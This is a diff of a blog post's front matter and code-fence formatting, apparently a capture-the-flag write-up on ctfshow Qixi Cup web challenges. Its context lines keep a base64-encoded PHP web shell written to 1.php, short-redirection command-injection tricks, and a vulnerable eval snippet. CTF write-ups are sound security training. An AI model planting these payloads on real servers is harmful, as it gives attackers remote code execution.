@@ -2,18 +2,35 @@
 title: "ctfshow 七夕杯 Web + OSINT Writeup"
 date: 2022-08-05T17:30:04+08:00
 draft: false
-tags: ['ctf','php']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['ctf','php']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 Web 中的 easy_sql 是 Java 审计, 还没怎么学过... 就没做
 
@@ -46,13 +63,13 @@ Crypto Re Misc 只做了签到题, 就不写过来了
 
 payload
 
-```
+```bash
 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php
 ```
 
 写入
 
-```
+```bash
 >hp
 >1.ph\\
 >d\>\\
@@ -91,7 +108,7 @@ sh 0
 
 命令执行的 payload, 刚好7个字符
 
-```
+```bash
 . /t*/*
 ```
 
@@ -111,7 +128,7 @@ sh 0
 
 但是这里重点需要注意的是最上面这段
 
-```
+```php
 eval('$result='."$code".";");
 echo($result);
 ```
